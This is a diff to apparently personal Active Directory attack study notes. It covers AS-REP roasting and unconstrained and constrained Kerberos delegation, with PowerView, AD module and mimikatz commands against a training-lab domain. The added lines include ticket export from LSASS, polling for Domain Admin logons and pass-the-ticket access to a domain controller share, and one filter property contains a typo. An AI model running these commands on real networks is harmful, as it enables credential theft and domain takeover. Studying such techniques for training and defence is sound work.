@@ -194,7 +194,7 @@
 > > > > > ```powershell
 > > > > > Invoke-ACLScanner -ResolveGUIDS | ?{$_.IdentityReferenceName -match <groupname>}
 > > > > > 
-> > > > > Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose
+> > > > > Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 > > > > > 
 > > > > > Get-DomainUser -PreAuthNotRequired -Verbose 
 > > > > > ```
@@ -209,9 +209,9 @@
 > > > >
 > > > > **AD Module**
 > > > >
-> > > > ```powershell
-> > > > Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesnNoteRequirePreAuth
-> > > > ```
+> > > > > ```powershell
+> > > > > Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesnNoteRequirePreAuth
+> > > > > ```
 > > >
 > > > **Exploit** {Request encrypted AS-REP for offline bruteforce}
 > > >
@@ -316,12 +316,67 @@
 > > ***Unconstrained Delegation*** -- Double hopes Kerberos 
 > >
 > > > :information_desk_person: Allow Access to any service on any computer in the domain 
+> > >
+> > > :information_desk_person: User present TGT inside TGS to the first Server's service 
+> > >
+> > > :information_desk_person: DC make sure that the TGT account owner is not marked as sensitive or can't be delegated 
+> > >
+> > > :information_desk_person: Incase UNC-Delegation enabled, TGT extracted from TGS and Stored in LSASS, that's how the server can reuse the user's TGT to access any other resources
+> > >
+> > > :rotating_light: Compromise machine with unconstrained delegation and a Domain Admin connects to that machine; 
+> > >
+> > > ***Enumerate Domain computer with unconstrained delegation***
+> > >
+> > > > ***PowerView***
+> > > >
+> > > > > ```powershell
+> > > > > Get-NetComputer -UnConstrained
+> > > > > ```
+> > > >
+> > > > ***Active Directory Module***
+> > > >
+> > > > > ```powershell
+> > > > > Get-ADComputer -Filter {TrustedForDelegation -eq $True}
+> > > > > Get-ADUser -Filter {TrustedForDelegation -eq $True}
+> > > > > ```
+> > >
+> > > ***Compromise The Machine***
+> > >
+> > > ***Extract Domain Admin Tokens*** 
+> > >
+> > > > ```powershell
+> > > > Invoke-mimikatz -Command '"sekurlsa::tickets /export"'
+> > > > ```
+> > > >
+> > > > ***Cron Job Watching logon***
+> > > >
+> > > > ```powershell
+> > > > Invoke-UserHunter -ComputerName <ServerName> -Poll 100 -Username <UserNAme> -Delay 5 -Verbose 
+> > > > ```
+> > >
+> > > ***Exploit***
+> > >
+> > > > **Reuse TGT ticket** 
+> > > >
+> > > > ```powershell
+> > > > Invoke-mimikatz -Command '"kerberos::ptt <tgtFilePAth>"'
+> > > > 
+> > > > ls \\dcorp-dc.dollarcorp.moneycorp.local\C$
+> > > > ```
 > >
 > > ***Constrained Delegation*** 
 > >
 > > > :information_desk_person: Request only to specified services on specified computers;
 > > >
 > > > :information_source: If the user is not using Kerberos Authentication to authenticate to the first hope server, Window offer protocol transition to transition the request to Kerberos
+> > >
+> > > :book: User authenticates to a web service without Kerberose and the web service makes requests to Database server fetching results based on the user's authorization. 
+> > >
+> > > ***Service for User to Self (S4U2self)*** : Allows Service to obtain a forwarded TGS to its self on behalf a user 
+> > >
+> > > ***Service for User to Proxy(S4U2proxy)*** : Allows a service to obtain a TGS to a second service on behalf a user 
+> >
+> > > 
 > >
 > > 
 
